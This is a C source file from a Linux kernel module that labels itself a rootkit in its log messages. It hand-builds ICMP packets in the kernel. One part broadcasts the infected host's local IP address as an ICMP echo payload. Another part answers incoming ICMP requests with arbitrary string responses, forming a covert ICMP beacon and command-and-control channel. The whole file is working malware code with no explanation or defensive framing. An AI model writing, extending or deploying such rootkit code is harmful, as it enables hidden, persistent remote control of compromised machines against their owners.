#include "icmp.h"


int send_icmp(char* payload, u32 src_num, u32 dst_num, struct net_device* dev) {
    int res;
    int payload_size = strlen(payload);
    unsigned char* data;
    static char dest_mac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
    struct sk_buff* skb;
    struct icmphdr* icmph;
    struct iphdr* iph;
    struct ethhdr* eth;

    printk(KERN_INFO "rootkit: 1\n");
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    printk(KERN_INFO "rootkit: 2\n");
    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);

    data = skb_put(skb, payload_size);
    memcpy(data, payload, payload_size);

    icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.gateway = 0;

    iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    iph->ihl = IP_HSIZE / 4;
    iph->version = 4; 
    iph->tos = 0;
    iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);
    iph->frag_off = 0;
    iph->ttl = 64; 
    iph->protocol = IPPROTO_ICMP; 
    iph->check = 0;
    iph->saddr = src_num;
    iph->daddr = dst_num;
    printk(KERN_INFO "rootkit: 3\n");
   

    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    eth->h_proto = skb->protocol;
    skb->no_fcs = 1;
    
    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, dest_mac, ETH_ALEN);
    res = dev_queue_xmit(skb);
    printk(KERN_INFO "rootkit: ret: %d\n", res);
    
    return res;


}


int return_icmp(char* string, args_t* args, struct net_device* dev){

    struct icmphdr* icmph = args->icmph;
    struct iphdr* iph = args->iph;
    struct ethhdr* eth = args->eth;

    u64 payload_size = strlen(string);
    u32 saddr_copy;
    unsigned char* payload;


    int ret;
    struct sk_buff* skb;
    struct icmphdr* new_icmph;
    struct iphdr* new_iph;
    struct ethhdr* new_eth;


    DEBUG_PUTS("rootkit: 1\n")
    // allocation memort for 3 headers + payload
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    DEBUG_PUTS("rootkit: 2\n")

    // reserving size for headers
    skb_reserve(skb, ICMP_HSIZE + IP_HSIZE + ETH_HLEN);

    // putting the payload in socket buffer
    payload = skb_put(skb, payload_size);
    memcpy(payload, string, payload_size);

    // icmp header needs only to change the type
    new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    memcpy(new_icmph, icmph, ICMP_HSIZE);
    new_icmph->type = ICMP_ECHOREPLY;

    new_icmph->checksum = 0;
    new_icmph->checksum = ip_compute_csum(new_icmph, payload_size + ICMP_HSIZE);


 
    new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    memcpy(new_iph, iph, IP_HSIZE);
    new_iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);

    // swapping sender and reciever
    saddr_copy = new_iph->saddr;
    new_iph->saddr = new_iph->daddr;
    new_iph->daddr = saddr_copy;
    DEBUG_PUTS("rootkit: 3\n")

    // configuring the socket
    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    skb->no_fcs = 1;
    


    new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
    memcpy(new_eth, eth, ETH_HLEN);

    memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(new_eth->h_dest, eth->h_source, ETH_ALEN);
    

    // adding the packet to transmit queue
    ret = dev_queue_xmit(skb);

    DEBUG_PRINTF("rootkit: ret: %d\n", ret)
    

    return ret;
}


static char* num_to_ip(u32 addr_num) {
    char* ip = kmalloc(IP_MAX_LENGTH, GFP_KERNEL);
    u8 ip_parts[4];
    u8 i;

    for (i = 0; i < 4; i++) {
        ip_parts[i] = addr_num & 255;
        addr_num >>= 8;
        
    }

    sprintf(ip, "%hu.%hu.%hu.%hu",
     ip_parts[0],
     ip_parts[1],
     ip_parts[2],
     ip_parts[3]
        );
    return ip;
}


int broadcast_ip(struct net_device *dev) {
    
    struct in_device *inet_device;
    struct in_ifaddr *inet_ifaddr;
    char* local_ip;
    u32 local_num;
    u32 broadcast_num;
    int res;

    inet_device = dev->ip_ptr;
    if (!inet_device) {
        return -1;
    }
    inet_ifaddr = inet_device->ifa_list;
    if (!inet_ifaddr) {
        return -2;
    }
    local_num = inet_ifaddr->ifa_local;
    broadcast_num = inet_ifaddr->ifa_broadcast;


    local_ip = num_to_ip(local_num);
    res = send_icmp(local_ip, local_num, broadcast_num, dev);
    kfree(local_ip);

    return res; 

}


void send_response(char* string, args_t* args) {
    
    struct net_device *enp0s3;
    enp0s3 = dev_get_by_name(&init_net,"enp0s3");

    return_icmp(string, args, enp0s3);

    // freeing the device
    dev_put(enp0s3);

    // freeing recieved packet content
    kfree_skb(args->skb);
}